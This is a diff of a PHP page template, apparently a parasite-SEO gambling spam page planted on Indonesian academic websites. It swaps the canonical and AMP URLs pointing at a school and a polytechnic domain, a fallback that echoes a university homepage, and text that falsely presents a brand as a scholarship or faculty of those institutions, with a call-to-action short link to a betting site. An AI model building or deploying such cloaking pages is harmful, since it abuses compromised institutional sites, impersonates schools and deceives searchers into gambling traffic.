@@ -1,7 +1,7 @@
 <?php
 function feedback404()
 {
-  echo file_get_contents("https://feb.unisba.ac.id/");
+  echo file_get_contents("https://polbitrada.ac.id/");
 
 }
 
@@ -32,15 +32,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://tamuramah.com/id/$dashbrand";
-$canonical = "https://sman1sanamanmantikei.sch.id/$dashbrand";
+$amphtml = "https://tamuramah.store/id/$dashbrand";
+$canonical = "https://polbitrada.ac.id/images/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731503467/OIG4.PR_b3W0fFZWm5_Z7MLd0_dv9jhs.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731503465/OIG4.4MDn1BeimdYlpOlpOi7o_phnj3z.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Silabus SMAN 1 Sanaman Mantikei";
-$desc = "$namabrand memberikan program beasiswa untuk semua siswa yang berprestasi di SMA Negeri 1 Sanaman Mantikei secara gratis, agar pelajar yang memiiliki keunggulan baik secara akademik bisa bersaing dengan sekolah lainnya.";
-$konten = "$namabrand memberikan program beasiswa untuk semua siswa yang berprestasi di SMA Negeri 1 Sanaman Mantikei secara gratis, agar pelajar yang memiiliki keunggulan baik secara akademik bisa bersaing dengan sekolah lainnya.";
+$judul = "$namabrand Politeknik Bina Trada Semarang";
+$desc = "$namabrand menjadi salah satu fakultas yang banyak diminati di kampus Politeknik Bina Trada di kota Semarang dengan adanya fasilitas yang cukup lengkap dengan bangunan kampus yang megah menjadi opsi untuk setiap pelajar ingin melanjutkan pendidikannya.";
+$konten = "$namabrand menjadi salah satu fakultas yang banyak diminati di kampus Politeknik Bina Trada di kota Semarang dengan adanya fasilitas yang cukup lengkap dengan bangunan kampus yang megah menjadi opsi untuk setiap pelajar ingin melanjutkan pendidikannya.";
 ?>
 
 <!DOCTYPE HTML>
